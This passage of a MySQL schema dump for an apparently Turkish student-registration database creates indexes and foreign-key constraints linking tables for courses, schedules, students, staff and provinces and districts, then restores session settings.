-- ---------------------------------------------------------


-- CREATE INDEX "FK_acilanderslerbolumler" ----------------
CREATE INDEX `FK_acilanderslerbolumler` USING BTREE ON `acilandersler`( `bolumNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_acilandersler_Personel" ----------------
CREATE INDEX `FK_acilandersler_Personel` USING BTREE ON `acilandersler`( `personelNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "NewIndex1" --------------------------------
CREATE INDEX `NewIndex1` USING BTREE ON `acilandersler`( `dersNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_dersprogrami" --------------------------
CREATE INDEX `FK_dersprogrami` USING BTREE ON `dersprogrami`( `acilandersNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_duyurular" -----------------------------
CREATE INDEX `FK_duyurular` USING BTREE ON `duyurular`( `personelNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_ilceler" -------------------------------
CREATE INDEX `FK_ilceler` USING BTREE ON `ilceler`( `il` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_ogrencikayit" --------------------------
CREATE INDEX `FK_ogrencikayit` USING BTREE ON `ogrencikayit`( `ogrenciNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_ogrencikayitderslar" -------------------
CREATE INDEX `FK_ogrencikayitderslar` USING BTREE ON `ogrencikayit`( `dersNo` );
-- ---------------------------------------------------------


-- CREATE INDEX "adi" --------------------------------------
CREATE INDEX `adi` USING BTREE ON `ogrenciler`( `adi` );
-- ---------------------------------------------------------


-- CREATE INDEX "danisman" ---------------------------------
CREATE INDEX `danisman` USING BTREE ON `ogrenciler`( `kayitTarihi` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_ogrenciler" ----------------------------
CREATE INDEX `FK_ogrenciler` USING BTREE ON `ogrenciler`( `ilce` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_ogrenciler_ogrenimdurumu" --------------
CREATE INDEX `FK_ogrenciler_ogrenimdurumu` USING BTREE ON `ogrenciler`( `ogrenimDurumu` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_ogrenciler_zamandilimi" ----------------
CREATE INDEX `FK_ogrenciler_zamandilimi` USING BTREE ON `ogrenciler`( `zamanDilimi` );
-- ---------------------------------------------------------


-- CREATE INDEX "il" ---------------------------------------
CREATE INDEX `il` USING BTREE ON `ogrenciler`( `il` );
-- ---------------------------------------------------------


-- CREATE INDEX "soyadi" -----------------------------------
CREATE INDEX `soyadi` USING BTREE ON `ogrenciler`( `soyadi` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_Personel" ------------------------------
CREATE INDEX `FK_Personel` USING BTREE ON `personel`( `il` );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_Personel_ilce" -------------------------
CREATE INDEX `FK_Personel_ilce` USING BTREE ON `personel`( `ilce` );
-- ---------------------------------------------------------


-- CREATE INDEX "NewIndex1" --------------------------------
CREATE INDEX `NewIndex1` USING BTREE ON `personel`( `soyadi` );
-- ---------------------------------------------------------


-- CREATE INDEX "NewIndex2" --------------------------------
CREATE INDEX `NewIndex2` USING BTREE ON `personel`( `adi` );
-- ---------------------------------------------------------


-- CREATE LINK "FK_acilandersler" --------------------------
ALTER TABLE `acilandersler`
	ADD CONSTRAINT `FK_acilandersler` FOREIGN KEY ( `dersNo` )
	REFERENCES `derskatalog`( `dersNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_acilanderslerbolumler" -----------------
ALTER TABLE `acilandersler`
	ADD CONSTRAINT `FK_acilanderslerbolumler` FOREIGN KEY ( `bolumNo` )
	REFERENCES `bolumler`( `bolumNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_acilandersler_personel" -----------------
ALTER TABLE `acilandersler`
	ADD CONSTRAINT `FK_acilandersler_personel` FOREIGN KEY ( `personelNo` )
	REFERENCES `personel`( `personelNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_dersprogrami" ---------------------------
ALTER TABLE `dersprogrami`
	ADD CONSTRAINT `FK_dersprogrami` FOREIGN KEY ( `acilandersNo` )
	REFERENCES `acilandersler`( `acilanderslerID` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_duyurular" ------------------------------
ALTER TABLE `duyurular`
	ADD CONSTRAINT `FK_duyurular` FOREIGN KEY ( `personelNo` )
	REFERENCES `personel`( `personelNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_ilceler" --------------------------------
ALTER TABLE `ilceler`
	ADD CONSTRAINT `FK_ilceler` FOREIGN KEY ( `il` )
	REFERENCES `iller`( `ilKodu` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_ogrencikayit" ---------------------------
ALTER TABLE `ogrencikayit`
	ADD CONSTRAINT `FK_ogrencikayit` FOREIGN KEY ( `ogrenciNo` )
	REFERENCES `ogrenciler`( `ogrenciNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_ogrencikayitderslar" --------------------
ALTER TABLE `ogrencikayit`
	ADD CONSTRAINT `FK_ogrencikayitderslar` FOREIGN KEY ( `dersNo` )
	REFERENCES `acilandersler`( `acilanderslerID` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_ogrenciler" -----------------------------
ALTER TABLE `ogrenciler`
	ADD CONSTRAINT `FK_ogrenciler` FOREIGN KEY ( `ilce` )
	REFERENCES `ilceler`( `ilceKodu` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_ogrenciler_ogrenimdurumu" ---------------
ALTER TABLE `ogrenciler`
	ADD CONSTRAINT `FK_ogrenciler_ogrenimdurumu` FOREIGN KEY ( `ogrenimDurumu` )
	REFERENCES `ogrenimdurumu`( `ogrenimNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_ogrenciler_zamandilimi" -----------------
ALTER TABLE `ogrenciler`
	ADD CONSTRAINT `FK_ogrenciler_zamandilimi` FOREIGN KEY ( `zamanDilimi` )
	REFERENCES `uygunzamandilimi`( `zamanDilimiNo` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "il" ----------------------------------------
ALTER TABLE `ogrenciler`
	ADD CONSTRAINT `il` FOREIGN KEY ( `il` )
	REFERENCES `iller`( `ilKodu` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_Personel" -------------------------------
ALTER TABLE `personel`
	ADD CONSTRAINT `FK_Personel` FOREIGN KEY ( `il` )
	REFERENCES `iller`( `ilKodu` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


-- CREATE LINK "FK_Personel_ilce" --------------------------
ALTER TABLE `personel`
	ADD CONSTRAINT `FK_Personel_ilce` FOREIGN KEY ( `ilce` )
	REFERENCES `ilceler`( `ilceKodu` )
	ON DELETE Restrict
	ON UPDATE Restrict;
-- ---------------------------------------------------------


/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
-- ---------------------------------------------------------


